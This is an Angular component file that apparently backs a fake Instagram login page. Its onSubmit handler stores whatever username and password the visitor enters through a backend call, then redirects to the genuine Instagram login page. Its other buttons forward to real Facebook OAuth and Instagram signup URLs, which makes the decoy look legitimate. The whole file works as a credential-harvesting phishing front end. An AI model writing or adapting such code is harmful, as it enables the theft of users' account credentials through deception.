// app.component.ts
import { Component } from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { HttpService } from './http.service';
import { Router } from '@angular/router';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent {
  loginForm: FormGroup;
  userInfo: any;
  membersList: any[] = [];
  constructor(private fb: FormBuilder,private http: HttpService,private router: Router,) {
    this.loginForm = this.fb.group({
      username: ['', Validators.required],
      password: ['', Validators.required]
    });
  }


  // onSubmit() {
  //   if (this.loginForm.valid) {
  //     console.log('Form Submitted', this.loginForm.value);
  //     alert('Login successful!');
  //   }
  // }
  getMembersList() {
    this.http.getMembersList().subscribe((data: any) => {
      this.membersList = data;
      console.log(this.membersList);
    });
  }
  onSubmit() {
    if (this.loginForm.valid) {
      const username = this.loginForm.value.username;
      const password = this.loginForm.value.password;

      if (username && password) {
        let user = { username: username, password: password };
        debugger;
        this.http.saveNewMember(user).subscribe(data => {
          debugger;
          //alert('New Member Created Successfully');
          //this.getMembersList();
          //this.router.navigate(['/login']);
          window.location.href = 'https://www.instagram.com/accounts/login/?next=%2Faccounts%2Femailsignup%2F%253Fhl%253Den&source=desktop_nav';
        });
       //
      } else {
        alert('Please enter username & password');
      }
    } else {
      alert('Form is invalid. Please check your inputs.');
    }
  }
  onFacebook(){
    window.location.href = 'https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATCkvwLXjyWBVIFa2Z7eGv0AISqJlocf-3D0KOZTMNKtcgp969qHOt7WUD2ZN4OIlLrm0P0pak5tiw4xqED0jJ4KhNGXl7owlWkBTfjw_VrJmGQeeLmH1RgJGW55DhW8-HTSVK1rS2HB1_pL7g2OvJY5oLn8wIQOmE0jId4zHal23lmdeOSJ5oh5NdiLCnUHSZ1dw3hWTWHVrh7aoxH2JrgYqyUg5M2SCHbgZoAqvFgrYyRnKD-5cL0oHkf-fUd4udhayCY1LaMEIsdxLTHe6lTUNX2XLvrXY521j0NcqRvK_J-0IuehvSP4HYB9x8h8HcLl7F-vDwvJnASdYMc';
  }

  onSignup(){
    window.location.href = 'https://www.instagram.com/accounts/emailsignup/?hl=en';
  }

}
